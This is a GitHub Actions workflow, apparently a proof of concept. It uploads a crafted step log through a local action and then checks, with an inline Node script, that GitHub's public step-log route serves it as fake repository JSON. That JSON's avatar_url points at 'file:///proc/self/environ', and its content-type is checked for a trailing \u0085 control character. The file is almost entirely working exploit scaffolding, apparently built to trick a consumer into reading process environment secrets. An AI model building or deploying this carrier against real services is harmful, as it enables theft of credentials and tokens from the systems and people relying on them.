name: Build Repo Cassette step-log carrier

on:
  push:
    branches:
      - codex/repo-cassette-release-routes
  workflow_dispatch:

permissions:
  actions: write
  contents: read

jobs:
  carrier:
    runs-on: ubuntu-latest
    outputs:
      job_id: ${{ steps.upload.outputs.job_id }}
      step_number: ${{ steps.upload.outputs.step_number }}
    steps:
      - uses: actions/checkout@v6
      - name: Carrier target
        run: echo carrier-target
      - id: upload
        name: Upload crafted step log
        uses: ./step-log-carrier
        env:
          GITHUB_TOKEN: ${{ github.token }}

  verify:
    needs: carrier
    runs-on: ubuntu-latest
    steps:
      - name: Verify public step-log route
        env:
          GITHUB_TOKEN: ${{ github.token }}
          REST_JOB_ID: ${{ needs.carrier.outputs.job_id }}
          STEP_NUMBER: ${{ needs.carrier.outputs.step_number }}
        run: |
          node <<'NODE'
          const https = require('node:https');
          const repository = process.env.GITHUB_REPOSITORY;
          const restJobId = process.env.REST_JOB_ID;
          const stepNumber = process.env.STEP_NUMBER;
          const sampleRepository = repository + '/actions/jobs/' + restJobId + '/steps/' + stepNumber + '/logs';
          const expected = Buffer.from(JSON.stringify({
            full_name: sampleRepository,
            owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
            description: 'Repo Cassette carrier',
            stargazers_count: 0,
          }));

          function request(url, headers = {}) {
            return new Promise((resolve, reject) => {
              const req = https.get(url, {headers}, response => {
                const chunks = [];
                response.on('data', chunk => chunks.push(chunk));
                response.on('end', () => resolve({
                  status: response.statusCode,
                  headers: response.headers,
                  body: Buffer.concat(chunks),
                }));
              });
              req.on('error', reject);
              req.setTimeout(20000, () => req.destroy(new Error('request timeout')));
            });
          }
          const headers = {
            authorization: 'Bearer ' + process.env.GITHUB_TOKEN,
            accept: 'application/vnd.github.v3+json',
            'user-agent': 'repo-cassette-step-log-verify',
          };
          const apiUrl = 'https://api.github.com/repos/' + repository + '/actions/jobs/' + restJobId + '/steps/' + stepNumber + '/logs';
          const api = await request(apiUrl, headers);
          let final = api;
          if (api.status === 302 && api.headers.location) final = await request(api.headers.location);
          const contentType = final.headers['content-type'] || '';
          console.log('STEP-LOG-VERIFY', JSON.stringify({
            apiStatus: api.status,
            finalStatus: final.status,
            contentTypeHex: Buffer.from(contentType, 'latin1').toString('hex'),
            expectedContentTypeHex: Buffer.from('application/json\\u0085', 'latin1').toString('hex'),
            bodyBytes: final.body.length,
            bodyMatch: final.body.equals(expected),
            bodyPreview: final.body.toString('utf8').slice(0, 300),
          }));
          NODE
